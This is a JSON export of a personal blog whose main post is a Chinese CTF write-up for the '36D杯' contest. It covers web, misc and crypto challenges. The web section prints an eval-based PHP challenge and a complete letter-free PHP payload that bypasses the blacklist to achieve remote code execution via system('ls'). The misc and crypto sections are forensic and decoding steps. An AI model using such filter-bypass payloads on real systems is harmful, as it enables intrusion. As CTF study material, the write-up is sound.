{"pages":[],"posts":[{"title":"36D杯","text":"详细请点 👇 36D杯官方地址 web你取吧考点:代码审计 无字母数字RCE 打开题目就给了源代码，一看就是代码审计 源码 👇 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 复制 👉12345678910111213141516&lt;?phperror_reporting(0);show_source(__FILE__);$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');$code=$_REQUEST['code'];$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^');$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) { if (preg_match ('/' . $blacklisted . '/im', $code)) { die('nonono'); }}eval(\"echo($code);\");?&gt; 黑名单里ban了数字字母，/im:不区分大小写.最后eval(“echo($code);”);首先闭合echo()成这样eval(&quot;echo(&quot; &quot;););“);加上以前p神写的无字母数字RCE,直接上payload： payload &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 复制 👉12345678910111213141516?code=\" \");$_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);// POST提交 打出flag 只要出题人善良 肯定 cat /flag 1_=system(\"ls\"); 提示一点，因为payload中有+所以上面的payload要url编码一下 Misc暗中观察下载下文件，拿到kali里面，file 文件名，发现是一个流量包，双击打开直接导出文件，也可以不打开 直接foremost 文件 分离出来文件 ，发现flag.zip,打开看一下，不是伪加密，拿到物理机爆破一下，三分钟未出结果，这个时候就要想到密码肯定实在流量包里，直接http.request.method==POST找POST包,发现四个，点击看一下，发现有一个id ，尝试zip密码，解出，falg.txt,拿到flag crypto签到给了提示,打开文件，是一种字符编码 需要rot一下 百度一下什么是rot，顺便解密.因为编码中有字符，所以确定是rot47 123W9@F0&gt;:2?0D9:07=28X/3/TUW/o/7/PUo/ST7/T/6/Rrot47一下(hou_mian_shi_flag)^b^%&amp;(^@^f^!&amp;@^$%f^%^e^# 然后)后面的字符对照着键盘进行转码一下 (对应符号的数字)打出来是6b6579626f6172645f656e63,是16进制,转一下字符得到eyboard_enc，加上flag{} flag{eyboard_enc}这里，我的方法比较笨，也比较费眼，官方给出了脚本 12345678910111213141516# -*- coding: utf-8 -*-# @Author: ynm3000# @Date: 2020-05-06 17:51:23# @Last Modified by: ynm3000# @Last Modified time: 2020-05-06 22:22:42# @email: kw2vgyt@gmail.com# @link: https://ctf.showorg_str = \"!@#$%^&amp;*()\"string = \"^b^%&amp;(^@^f^!&amp;@^$%f^%^e^#\"res = ''for i in string: res += str(org_str.find(i)+1) if org_str.find(i)&gt;-1 else iprint('flag{'+bytes.decode(bytes.fromhex(res),encoding='utf-8')+'}') 一步直接打出flag 有兴趣的同学可以试一下 bohemian原创文章,转载请标明作者与文章链接本文连接:bohe-mian.com","link":"/2020/05/09/36D%E6%9D%AF/"},{"title":"welcome","text":"hello my friend ，welcome to bohemian’s blog. 12$ I will share some of my experiences here in the future, I hope you can come often.$ Thank you.","link":"/2020/05/07/hello/"}],"tags":[{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"36D杯","slug":"36D杯","link":"/tags/36D%E6%9D%AF/"}],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"}]}